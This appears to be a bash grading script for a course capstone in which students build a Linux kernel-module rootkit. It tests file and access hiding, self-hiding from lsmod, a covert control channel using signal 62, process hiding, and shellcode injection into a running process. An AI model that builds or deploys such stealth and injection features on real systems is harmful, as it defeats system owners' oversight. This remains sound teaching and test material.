#!/bin/bash
# test_lkm.sh - Automated tests for the LKM rootkit
#
# Usage:
#   sudo bash test_lkm.sh               # all tests
#   sudo bash test_lkm.sh file_hide     # just file hiding
#   sudo bash test_lkm.sh access_block  # just access blocking
#   sudo bash test_lkm.sh c2            # just C2
#
# Available: file_hide, access_block, module_hide, c2, proc_hide, inject

# NO set -e

MODULE=""
for candidate in rootkit.ko lkm/rootkit.ko; do
    [ -f "$candidate" ] && MODULE="$candidate" && break
done

# Copy mykill to /tmp so it's on a real filesystem (9p may block exec)
MYKILL=""
for candidate in mykill tools/mykill; do
    if [ -f "$candidate" ]; then
        cp "$candidate" /tmp/mykill 2>/dev/null && chmod +x /tmp/mykill && MYKILL="/tmp/mykill"
        break
    fi
done

PASS=0
FAIL=0
SKIP=0
TOTAL=0

pass()  { echo "  PASS: $1"; PASS=$((PASS + 1)); TOTAL=$((TOTAL + 1)); }
fail()  { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); TOTAL=$((TOTAL + 1)); }
skip()  { echo "  SKIP: $1"; SKIP=$((SKIP + 1)); TOTAL=$((TOTAL + 1)); }

rkcmd() {
    if [ -n "$MYKILL" ]; then
        "$MYKILL" "$@" 2>/dev/null
    else
        case "$1" in
            status)      kill -62 0 2>/dev/null ;;
            hide-files)  kill -62 1 2>/dev/null ;;
            block)       kill -62 2 2>/dev/null ;;
            hide-module) kill -62 3 2>/dev/null ;;
            hide-procs)  kill -62 4 2>/dev/null ;;
            *)           return 1 ;;
        esac
    fi
}

MODULE_LOADED=false

cleanup() {
    jobs -p | xargs -r kill 2>/dev/null || true
    wait 2>/dev/null || true
    if $MODULE_LOADED; then
        rkcmd hide-module 2>/dev/null || true
        sleep 0.5
        rmmod rootkit 2>/dev/null || true
    fi
    rm -rf /tmp/secret /dev/shm/secret 2>/dev/null || true
    rm -f /tmp/normal_file.txt /tmp/pwned 2>/dev/null || true
}
trap cleanup EXIT

if [ "$(id -u)" -ne 0 ]; then
    echo "ERROR: Must run as root."
    exit 1
fi
if [ -z "$MODULE" ]; then
    echo "ERROR: rootkit.ko not found."
    exit 1
fi

# Test group comes from $1 (default: all). Dispatch is at the bottom.

echo "=== Capstone: LKM Rootkit Tests ==="
echo ""

# Setup test fixtures BEFORE loading module
mkdir -p /tmp/secret /dev/shm/secret
echo "flag_tmp" > /tmp/secret/flag.txt
echo "flag_shm" > /dev/shm/secret/flag.txt
echo "not_blocked" > /tmp/normal_file.txt
dmesg -C

echo "Loading module: $MODULE"
if insmod "$MODULE" 2>/dev/null; then
    pass "insmod rootkit.ko"
    MODULE_LOADED=true
    sleep 1
else
    fail "insmod rootkit.ko (check dmesg)"
    echo ""
    dmesg | tail -5 | sed 's/^/    /'
    echo ""
    echo "  Hint: rootkit_init() must return 0."
    echo ""
    echo "=== Results: $PASS passed, $FAIL failed, $SKIP skipped (out of $TOTAL) ==="
    exit 1
fi

# -- File hiding --------------------------------------------------------------

run_file_hide_tests() {
    echo ""
    echo "--- File hiding ---"

    # /tmp/secret should be invisible in /tmp listing
    if ls /tmp | grep -q "^secret$"; then
        fail "/tmp/secret visible in ls /tmp"
    else
        pass "/tmp/secret hidden from ls /tmp"
    fi

    # /dev/shm/secret should be invisible
    if ls /dev/shm | grep -q "^secret$"; then
        fail "/dev/shm/secret visible in ls /dev/shm"
    else
        pass "/dev/shm/secret hidden from ls /dev/shm"
    fi

    # Normal files still visible
    if ls /tmp | grep -q "normal_file"; then
        pass "normal_file.txt still visible in /tmp"
    else
        fail "normal_file.txt incorrectly hidden"
    fi
}

# -- Access blocking ----------------------------------------------------------

run_access_block_tests() {
    echo ""
    echo "--- Access blocking ---"

    if cat /tmp/secret/flag.txt 2>/dev/null; then
        fail "/tmp/secret/flag.txt accessible (should be blocked)"
    else
        pass "/tmp/secret/flag.txt blocked"
    fi

    if cat /dev/shm/secret/flag.txt 2>/dev/null; then
        fail "/dev/shm/secret/flag.txt accessible (should be blocked)"
    else
        pass "/dev/shm/secret/flag.txt blocked"
    fi

    if ls /tmp/secret/ >/dev/null 2>&1; then
        fail "ls /tmp/secret/ succeeded (should be blocked)"
    else
        pass "ls /tmp/secret/ blocked"
    fi

    # Traversal: ../../../../tmp/secret should also be blocked
    if cat "$(pwd)/../../../../tmp/secret/flag.txt" 2>/dev/null; then
        fail "Traversal path to /tmp/secret not blocked"
    else
        pass "Traversal path to /tmp/secret blocked"
    fi

    if dmesg | grep -q "rootkit.*blocked"; then
        pass "Blocked access logged in dmesg"
    else
        fail "No blocked access log in dmesg"
    fi

    # Non-hidden paths still work
    if [ "$(cat /tmp/normal_file.txt 2>&1)" = "not_blocked" ]; then
        pass "Non-hidden file still accessible"
    else
        fail "Non-hidden file broken"
    fi
}

# -- Module self-hiding -------------------------------------------------------

run_module_hide_tests() {
    echo ""
    echo "--- Module hiding ---"

    if lsmod | grep -q "rootkit"; then
        fail "rootkit visible in lsmod"
    else
        pass "rootkit hidden from lsmod"
    fi

    if grep -q "rootkit" /proc/modules 2>/dev/null; then
        fail "rootkit visible in /proc/modules"
    else
        pass "rootkit hidden from /proc/modules"
    fi
}

# -- Covert C2 ----------------------------------------------------------------

run_c2_tests() {
    echo ""
    echo "--- C2 ---"

    if rkcmd status; then
        pass "C2 status"
    else
        fail "C2 status failed"
    fi

    if kill -0 $$ 2>/dev/null; then
        pass "Regular kill unaffected"
    else
        fail "Regular kill broken"
    fi

    # Toggle file hiding off
    rkcmd hide-files
    sleep 1
    if ls /tmp | grep -q "^secret$"; then
        pass "C2: file hiding disabled"
    else
        fail "C2: file hiding disable had no effect"
    fi

    # Toggle back on
    rkcmd hide-files
    sleep 1
    if ls /tmp | grep -q "^secret$"; then
        fail "C2: file hiding re-enable failed"
    else
        pass "C2: file hiding re-enabled"
    fi

    # Toggle access blocking off
    rkcmd block
    sleep 1
    if cat /tmp/secret/flag.txt 2>/dev/null; then
        pass "C2: access blocking disabled"
    else
        fail "C2: access blocking disable had no effect"
    fi

    # Toggle back on
    rkcmd block
    sleep 1
    if cat /tmp/secret/flag.txt 2>/dev/null; then
        fail "C2: access blocking re-enable failed"
    else
        pass "C2: access blocking re-enabled"
    fi

    # Non-magic signal passthrough
    sleep 300 &
    local SPID=$!
    sleep 0.5
    kill -9 $SPID 2>/dev/null
    wait $SPID 2>/dev/null || true
    if ! kill -0 $SPID 2>/dev/null; then
        pass "Non-magic signal passes through"
    else
        fail "kill -9 may have been intercepted"
    fi
}

# -- Process hiding -----------------------------------------------------------

run_proc_hide_tests() {
    echo ""
    echo "--- Process hiding ---"

    if [ -z "$MYKILL" ]; then
        skip "Requires mykill"
        return
    fi

    sleep 300 &
    local TPID=$!
    sleep 0.5

    if ! ls /proc | grep -q "^${TPID}$"; then
        fail "PID $TPID not visible before hiding (bad setup)"
        kill $TPID 2>/dev/null; wait $TPID 2>/dev/null || true
        return
    fi

    "$MYKILL" add-gid "$TPID" 2>/dev/null
    sleep 3

    if ls /proc | grep -q "^${TPID}$"; then
        fail "PID $TPID still visible after add-gid"
    else
        pass "PID $TPID hidden from /proc"
    fi

    if kill -0 $TPID 2>/dev/null; then
        pass "kill -0 still reaches hidden process"
    else
        fail "kill -0 cannot reach hidden process"
    fi

    kill $TPID 2>/dev/null; wait $TPID 2>/dev/null || true
}

# -- Injection ----------------------------------------------------------------

run_inject_tests() {
    echo ""
    echo "--- Injection ---"

    if [ -z "$MYKILL" ]; then
        skip "Requires mykill"
        return
    fi

    sleep 300 &
    local IPID=$!
    sleep 0.5
    rm -f /tmp/pwned

    # Use inject_test.bin if available (exercises the staging path).
    # The binary writes "INJECTED-1337 ..." to /tmp/pwned then returns.
    SC_BIN=""
    for candidate in inject_test.bin tools/inject_test.bin; do
        [ -f "$candidate" ] && SC_BIN="$candidate" && break
    done

    if [ -n "$SC_BIN" ]; then
        "$MYKILL" inject "$IPID" "$SC_BIN" 2>/dev/null
    else
        "$MYKILL" inject "$IPID" 2>/dev/null
    fi
    sleep 3

    if [ -f /tmp/pwned ]; then
        pass "Shellcode created /tmp/pwned"
        if grep -q "INJECTED-1337" /tmp/pwned 2>/dev/null; then
            pass "/tmp/pwned contains INJECTED-1337"
        else
            fail "/tmp/pwned wrong content: $(cat /tmp/pwned 2>/dev/null)"
        fi
    else
        fail "/tmp/pwned not created"
    fi

    if kill -0 $IPID 2>/dev/null; then
        pass "Target survived injection"
    else
        fail "Target died after injection"
    fi

    kill $IPID 2>/dev/null; wait $IPID 2>/dev/null || true
}

# -- Unload -------------------------------------------------------------------

run_unload_tests() {
    echo ""
    echo "--- Unload ---"

    rkcmd hide-module 2>/dev/null || true
    sleep 0.5

    if rmmod rootkit 2>/dev/null; then
        MODULE_LOADED=false
        pass "rmmod succeeded"
    else
        fail "rmmod failed"
        MODULE_LOADED=false
    fi
    sleep 1

    if ls /tmp | grep -q "^secret$"; then
        pass "secret visible after unload"
    else
        fail "secret still hidden after unload"
    fi

    if dmesg | grep -q "rootkit.*cleaning up"; then
        pass "Clean exit in dmesg"
    else
        fail "No clean exit in dmesg"
    fi
}

# -- Dispatch -----------------------------------------------------------------

WANT="${1:-all}"

if [ "$WANT" = "all" ] || [ "$WANT" = "file_hide" ];    then run_file_hide_tests;    fi
if [ "$WANT" = "all" ] || [ "$WANT" = "access_block" ]; then run_access_block_tests;  fi
if [ "$WANT" = "all" ] || [ "$WANT" = "module_hide" ];  then run_module_hide_tests;   fi
if [ "$WANT" = "all" ] || [ "$WANT" = "c2" ];           then run_c2_tests;            fi
if [ "$WANT" = "all" ] || [ "$WANT" = "proc_hide" ];    then run_proc_hide_tests;     fi
if [ "$WANT" = "all" ] || [ "$WANT" = "inject" ];       then run_inject_tests;        fi
if [ "$WANT" = "all" ];                                  then run_unload_tests;        fi

echo ""
echo "=== Results: $PASS passed, $FAIL failed, $SKIP skipped (out of $TOTAL) ==="
[ $FAIL -gt 0 ] && echo "  dmesg: sudo dmesg | grep rootkit"
exit $FAIL
